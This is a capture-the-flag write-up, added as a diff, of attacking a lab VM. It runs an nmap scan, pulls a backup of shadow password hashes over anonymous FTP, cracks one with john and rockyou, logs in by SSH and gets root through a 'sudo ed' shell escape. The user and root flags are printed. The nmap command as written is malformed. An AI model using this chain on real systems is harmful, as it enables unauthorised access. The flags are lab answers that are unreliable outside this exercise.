@@ -1,0 +1,101 @@
+I started with a nmap scan to discover open ports 
+
+# nmap command
+
+sudo -sC -sV -oN nmap/scan 10.0.2.252
+
+# nmap results
+
+Nmap scan report for 10.0.2.252
+Host is up (0.00018s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     pyftpdlib 1.5.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--   1 root     root         1062 Jul 29  2019 backup
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|  Connected to: 10.0.2.252:21
+|  Waiting for username.
+|  TYPE: ASCII; STRUcture: File; MODE: Stream
+|  Data connection closed.
+|_End of status.
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 71:bd:fa:c5:8c:88:7c:22:14:c4:20:03:32:36:05:d6 (RSA)
+|   256 35:92:8e:16:43:0c:39:88:8e:83:0d:e2:2c:a4:65:91 (ECDSA)
+|_  256 45:c5:40:14:49:cf:80:3c:41:4f:bb:22:6c:80:1e:fe (ED25519)
+MAC Address: 08:00:27:4B:8E:FF (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+I see that there is anonymous login to the ftp server and a file called backup so that will be 
+the first thing that I look at. It could have possible usernames, passwords or ssh keys.
+
+# ftp login command
+
+ftp 10.0.2.252
+
+# ftp login username and password
+
+I used anonymous and the username (because of the anonymous login being available) and left the password blank (just hit enter)
+
+# ftp get command
+
+get backup
+
+It looks like the contents of backup that I downloaded from the ftp server contain the hashed password
+from /etc/shadow
+
+# backup file contents
+
+CREDENTIALS:                                                                                                                                                                                                       
+office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.                                                                                                                  
+datacenter:$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/                                                                                                              
+sky:$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0                                                               
+sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
+space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/
+
+
+I will use john the ripper to see if I can crack any of the passwords
+
+I had no success cracking a password with john
+ 
+After that I removed all the usernames and hashes and from the file except the password hash that belonged
+to the 'sunset' user and renamed the file 'hash' and ran john against that one hash only and was able to crack the password that way
+
+# contents of hash file
+
+$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
+
+# john command
+
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+# john results
+
+cheer14	(?)
+
+# credentials for sunset user
+
+sunset:cheer14
+
+Using the credentials from above I was able to login to ssh 
+
+Once on the target machine I ran sudo -l to see if I could run any commands as another user for possible privilege escalation
+and found that I could run '/usr/bin/ed' command as root without a password
+
+Before advancing to root I got the user flag
+
+# user flag
+
+5b5b8e9b01ef27a1cc0a2d5fa87d7190
+
+Looking at 'gtfobins' you can privilege escalate to root with 'sudo ed' then typing '!/bin/bash'
+
+As root I navigated to /root/ to get the root flag
+
+# root flag
+
+25d7ce0ee3cbf71efbac61f85d0c14fe
